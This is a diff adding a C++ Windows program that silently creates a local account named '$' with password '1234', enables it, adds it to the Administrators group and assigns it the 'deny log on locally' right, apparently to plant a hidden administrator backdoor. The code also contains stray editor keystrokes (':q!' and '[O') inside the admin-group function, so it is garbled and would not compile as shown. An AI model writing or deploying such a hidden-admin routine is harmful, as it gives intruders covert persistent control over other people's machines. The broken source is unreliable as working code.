@@ -1,0 +1,188 @@
+#include <iostream>
+#include <windows.h>
+#include <lm.h>
+#include <string>
+#include <ntsecapi.h>
+#include <vector>
+
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "netapi32.lib")
+
+using namespace std;
+
+int AddUserToDenyLogonLocally(const wchar_t* username) {
+    LSA_HANDLE policyHandle;
+    LSA_OBJECT_ATTRIBUTES objectAttributes = {};
+    PSID userSID = nullptr;
+    LSA_UNICODE_STRING userRight;
+
+    if (LsaOpenPolicy(nullptr, &objectAttributes, POLICY_CREATE_ACCOUNT | POLICY_LOOKUP_NAMES, &policyHandle) != 0) {
+        MessageBox(NULL, L"Error in open Policy Handle.", L"Error", MB_OK | MB_ICONINFORMATION);
+        return 0;
+    }
+
+    DWORD sidSize = 0, domainSize = 0;
+    SID_NAME_USE sidType;
+    LookupAccountNameW(nullptr, username, nullptr, &sidSize, nullptr, &domainSize, &sidType);
+
+    vector<BYTE> sidBuffer(sidSize);
+    vector<wchar_t> domainName(domainSize);
+
+    userSID = reinterpret_cast<PSID>(sidBuffer.data());
+    if (!LookupAccountNameW(nullptr, username, userSID, &sidSize, domainName.data(), &domainSize, &sidType)) {
+        MessageBox(NULL, L"Error in Resive econt Data.", L"Error", MB_OK | MB_ICONINFORMATION);
+        LsaClose(policyHandle);
+        return 0;
+    }
+
+
+    wchar_t rightName[] = L"SeDenyInteractiveLogonRight";
+    userRight.Buffer = rightName;
+    userRight.Length = (wcslen(rightName) * sizeof(wchar_t));
+    userRight.MaximumLength = userRight.Length + sizeof(wchar_t);
+
+
+    if (LsaAddAccountRights(policyHandle, userSID, &userRight, 1) != 0) {
+        MessageBox(NULL, L"Error in Add user in 'Deny log on locally' .", L"Error", MB_OK | MB_ICONINFORMATION);
+        LsaClose(policyHandle);
+        return 0;
+
+    }
+    else {
+        MessageBox(NULL, L"Add user in 'Deny log on locally' sucses.", L"Error", MB_OK | MB_ICONINFORMATION);
+    }
+
+    LsaClose(policyHandle);
+}
+
+int AddUser()
+{
+    USER_INFO_1 ui;
+    DWORD dwError = 0;
+
+    ui.usri1_name = (LPWSTR)L"$";
+    ui.usri1_password = (LPWSTR)L"1234";
+    ui.usri1_priv = USER_PRIV_USER;
+    ui.usri1_home_dir = NULL;
+    ui.usri1_comment = NULL;
+    ui.usri1_flags = UF_SCRIPT;
+    ui.usri1_script_path = NULL;
+
+    NET_API_STATUS nStatus = NetUserAdd(NULL, 1, (LPBYTE)&ui, &dwError);
+
+    if (nStatus == NERR_Success) {
+        MessageBox(NULL, L"User Add Is OK.", L"User Aded", MB_OK | MB_ICONINFORMATION);
+    }
+    else {
+        wstring message = L"User Add Gived Error. This Is Error Resoult: \n" + to_wstring(nStatus);
+        MessageBox(NULL, message.c_str(), L"User Aded", MB_OK | MB_ICONINFORMATION);
+        return 0;
+    }
+    return 1;
+}
+
+
+int AnabellUser()
+{
+    const wchar_t* username = L"$";
+
+    USER_INFO_1008 ui;
+    ui.usri1008_flags = UF_NORMAL_ACCOUNT;
+
+    NET_API_STATUS nStatus = NetUserSetInfo(NULL, username, 1008, (LPBYTE)&ui, NULL);
+
+
+    if (nStatus == NERR_Success) {
+        MessageBox(NULL, L"User Anabell Is OK.", L"User Aded", MB_OK | MB_ICONINFORMATION);
+    }
+    else {
+        wstring message = L"User Anabell Gived Error. This Is Error Resoult: \n" + to_wstring(nStatus);
+        MessageBox(NULL, message.c_str(), L"User Aded", MB_OK | MB_ICONINFORMATION);
+        return 0;
+    }
+
+    return 1;
+}
+
+
+
+int AddToAdminGrop()
+{
+    const wchar_t* username = L"$";
+    const wchar_t* groupName = L"Administrators";
+    :q!
+    [O
+    LOCALGROUP_MEMBERS_INFO_3 member;
+    member.lgrmi3_domainandname = (LPWSTR)username;
+
+    NET_API_STATUS nStatus = NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&member, 1);
+
+    if (nStatus == NERR_Success) {
+        MessageBox(NULL, L"User Add To Admin Grop Is OK.", L"User Aded", MB_OK | MB_ICONINFORMATION);
+    }
+    else {
+        wstring message = L"User Add To Admin Grop Gived Error. This Is Error Resoult: \n" + to_wstring(nStatus);
+        MessageBox(NULL, message.c_str(), L"User Aded", MB_OK | MB_ICONINFORMATION);
+        return 0;
+    }
+
+    return 1;
+}
+
+int AddToUsersGroup()
+{
+    const wchar_t* username = L"$";
+    const wchar_t* groupName = L"Users";
+    LOCALGROUP_MEMBERS_INFO_3 member;
+    member.lgrmi3_domainandname = (LPWSTR)username;
+    NET_API_STATUS nStatus = NetLocalGroupAddMembers(NULL, groupName, 3, (LPBYTE)&member, 1);
+    if (nStatus == NERR_Success) {
+        MessageBox(NULL, L"User added to Users group.", L"User Management", MB_OK | MB_ICONINFORMATION);
+    }
+    else {
+        wstring message = L"Error adding user to Users group. Error code: \n" + to_wstring(nStatus);
+        MessageBox(NULL, message.c_str(), L"User Management", MB_OK | MB_ICONINFORMATION);
+        return 0;
+    }
+    return 1;
+}
+
+
+int main()
+{
+    FreeConsole();
+
+    int AddUserResult = AddUser();
+    if (AddUserResult == 0)
+    {
+        return -1;
+
+    }
+
+    int AnabellUserResult = AnabellUser();
+    if (AnabellUserResult == 0)
+    {
+        return -2;
+    }
+
+    int AddToAdminGropResult = AddToAdminGrop();
+    if (AddToAdminGropResult == 0)
+    {
+        return -3;
+    }
+
+    int AddToUsersGroupResult = AddToUsersGroup();
+    if (AddToUsersGroupResult == 0)
+    {
+        return -4;
+    }
+
+    int AddUserToDenyLogonLocallyResul = AddUserToDenyLogonLocally(L"$");
+    if (AddUserToDenyLogonLocallyResul == 0)
+    {
+        return -5;
+    }
+
+    return 0;
+}
+
